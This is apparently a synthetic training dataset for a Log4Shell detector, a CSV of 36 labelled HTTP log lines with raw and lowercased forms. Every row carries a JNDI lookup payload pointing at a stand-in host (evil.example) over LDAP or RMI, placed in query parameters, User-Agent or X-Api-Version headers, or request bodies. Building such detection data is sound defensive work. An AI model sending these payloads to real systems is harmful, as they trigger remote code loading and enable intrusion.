id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000001,2026-05-17,synthetic,GET /?q=${jndi:ldap://evil.example/a} HTTP/1.1,get /?q=${jndi:ldap://evil.example/a} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000002,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://evil.example/a} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/a} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000003,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/a} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://evil.example/a} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,train,critical
LS-000004,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/a},request from user-agent: ${jndi:ldap://evil.example/a},1,log4shell,plain,user_agent_minimal,train,critical
LS-000005,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jndi:ldap://evil.example/a},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://evil.example/a},1,log4shell,plain,x_api_version,train,critical
LS-000006,2026-05-17,synthetic,GET /search?q=${jndi:ldap://evil.example/a} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldap://evil.example/a} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,plain,path,train,critical
LS-000007,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://evil.example/a},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/a},1,log4shell,plain,body,train,critical
LS-000008,2026-05-17,synthetic,GET /?q=${jndi:ldap://evil.example/a} HTTP/1.1,get /?q=${jndi:ldap://evil.example/a} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000009,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://evil.example/a} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/a} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000010,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/a} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://evil.example/a} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,train,critical
LS-000011,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/a},request from user-agent: ${jndi:ldap://evil.example/a},1,log4shell,plain,user_agent_minimal,train,critical
LS-000012,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jndi:ldap://evil.example/a},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://evil.example/a},1,log4shell,plain,x_api_version,train,critical
LS-000013,2026-05-17,synthetic,GET /?q=${jndi:ldap://evil.example/b} HTTP/1.1,get /?q=${jndi:ldap://evil.example/b} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000014,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://evil.example/b} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/b} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000015,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/b} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://evil.example/b} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,train,critical
LS-000016,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/b},request from user-agent: ${jndi:ldap://evil.example/b},1,log4shell,plain,user_agent_minimal,train,critical
LS-000017,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${jndi:ldap://evil.example/b},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://evil.example/b},1,log4shell,plain,x_api_version,train,critical
LS-000018,2026-05-17,synthetic,GET /search?q=${jndi:ldap://evil.example/b} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://evil.example/b} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,plain,path,train,critical
LS-000019,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://evil.example/b},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/b},1,log4shell,plain,body,train,critical
LS-000020,2026-05-17,synthetic,GET /?q=${jndi:ldap://evil.example/b} HTTP/1.1,get /?q=${jndi:ldap://evil.example/b} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000021,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://evil.example/b} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/b} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000022,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/b} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://evil.example/b} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,train,critical
LS-000023,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/b},request from user-agent: ${jndi:ldap://evil.example/b},1,log4shell,plain,user_agent_minimal,train,critical
LS-000024,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:ldap://evil.example/b},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://evil.example/b},1,log4shell,plain,x_api_version,train,critical
LS-000025,2026-05-17,synthetic,GET /?q=${jndi:rmi://evil.example/c} HTTP/1.1,get /?q=${jndi:rmi://evil.example/c} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000026,2026-05-17,synthetic,GET /api/check?debug=${jndi:rmi://evil.example/c} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://evil.example/c} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000027,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://evil.example/c} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:rmi://evil.example/c} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,train,critical
LS-000028,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://evil.example/c},request from user-agent: ${jndi:rmi://evil.example/c},1,log4shell,plain,user_agent_minimal,train,critical
LS-000029,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:rmi://evil.example/c},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:rmi://evil.example/c},1,log4shell,plain,x_api_version,train,critical
LS-000030,2026-05-17,synthetic,GET /search?q=${jndi:rmi://evil.example/c} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:rmi://evil.example/c} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,plain,path,train,critical
LS-000031,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:rmi://evil.example/c},post /search http/1.1 host: app.local body: query=${jndi:rmi://evil.example/c},1,log4shell,plain,body,train,critical
LS-000032,2026-05-17,synthetic,GET /?q=${jndi:rmi://evil.example/c} HTTP/1.1,get /?q=${jndi:rmi://evil.example/c} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000033,2026-05-17,synthetic,GET /api/check?debug=${jndi:rmi://evil.example/c} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://evil.example/c} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000034,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://evil.example/c} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:rmi://evil.example/c} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,train,critical
LS-000035,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://evil.example/c},request from user-agent: ${jndi:rmi://evil.example/c},1,log4shell,plain,user_agent_minimal,train,critical
LS-000036,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:rmi://evil.example/c},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:rmi://evil.example/c},1,log4shell,plain,x_api_version,train,critical
